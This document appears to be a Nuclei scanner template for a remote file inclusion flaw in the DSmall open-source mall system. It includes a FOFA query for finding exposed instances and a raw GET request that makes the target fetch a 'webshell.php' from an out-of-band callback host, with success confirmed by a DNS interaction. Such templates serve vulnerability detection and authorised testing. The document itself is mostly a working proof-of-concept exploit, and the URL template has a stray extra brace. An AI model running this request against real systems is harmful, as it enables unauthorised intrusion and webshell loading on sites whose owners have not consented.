id: dsmall-get_url_contents-rfi
info:
  name: "DSmall 开源多用户商城系统 get_url_contents 函数远程文件包含"
  author: 0dayPoc
  severity: high
  description: |-
    fofa: body="var HOMESITEURL" && body="var HOMESITEROOT"
          DSmall开源多用户商城系统在get_url_contents函数中存在远程文件包含缺陷，攻击者可通过构造恶意请求参数实现远程服务器资源加载。该漏洞允许未经验证的远程用户通过路径注入方式获取系统文件访问权限。
  tags: DSMall
http:
- raw:
  - |
    GET /public/home/Connectwx/get_url_contents/?url=http://{{interactsh-url}}}/webshell.php HTTP/1.1
    Host: {{Hostname}}
  matchers-condition: and
  matchers:
  - type: status
    status:
    - 200
  - type: word
    part: interactsh_protocol
    words:
    - "dns"
